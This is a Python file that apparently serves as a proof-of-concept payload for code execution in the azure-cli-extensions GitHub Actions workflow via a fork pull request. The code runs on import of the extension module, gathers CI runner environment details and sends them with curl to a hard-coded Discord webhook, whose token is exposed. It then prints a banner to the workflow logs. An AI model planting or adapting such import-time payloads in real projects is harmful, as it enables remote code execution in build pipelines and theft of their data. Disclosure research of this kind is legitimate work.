# Security research PoC - proves code execution via pull_request_target
# This code runs when azdev imports the extension module

import os
import json
import subprocess
import datetime

poc_data = {
    "poc": "pull_request_target RCE via azdev extension add",
    "researcher": "Bodlux",
    "timestamp": datetime.datetime.utcnow().isoformat(),
    "github_run_id": os.environ.get("GITHUB_RUN_ID", "unknown"),
    "github_repository": os.environ.get("GITHUB_REPOSITORY", "unknown"),
    "github_event_name": os.environ.get("GITHUB_EVENT_NAME", "unknown"),
    "github_actor": os.environ.get("GITHUB_ACTOR", "unknown"),
    "runner_name": os.environ.get("RUNNER_NAME", "unknown"),
    "runner_os": os.environ.get("RUNNER_OS", "unknown"),
}

# Method 1: curl to Discord webhook (most reliable)
webhook_url = "https://discord.com/api/webhooks/1492977203141410952/P1N55vfdmkh1LUQum96RVFiaYhyO5OBiBNh9G9TJFAXppohnik7NO8dW2NV4dVoztj1Y"

message = json.dumps({
    "content": (
        "**PoC: pull_request_target RCE - azure-cli-extensions**\n"
        "```\n"
        f"Repo: {poc_data['github_repository']}\n"
        f"Run ID: {poc_data['github_run_id']}\n"
        f"Event: {poc_data['github_event_name']}\n"
        f"Actor: {poc_data['github_actor']}\n"
        f"Runner: {poc_data['runner_name']}\n"
        f"Time: {poc_data['timestamp']}\n"
        "```\n"
        "Arbitrary code execution achieved via fork PR.\n"
        "No secrets were accessed."
    )
})

try:
    subprocess.run(
        ["curl", "-s", "-X", "POST", "-H", "Content-Type: application/json",
         "-d", message, webhook_url],
        timeout=10,
        capture_output=True
    )
except Exception:
    pass

# Method 2: print to stdout (visible in workflow logs)
print("\n" + "=" * 60)
print("  [PoC] Arbitrary code execution via pull_request_target")
print(f"  Repository: {poc_data['github_repository']}")
print(f"  Run ID: {poc_data['github_run_id']}")
print(f"  Event: {poc_data['github_event_name']}")
print(f"  Runner: {poc_data['runner_name']}")
print("  No secrets accessed. This is a harmless PoC.")
print("=" * 60 + "\n")
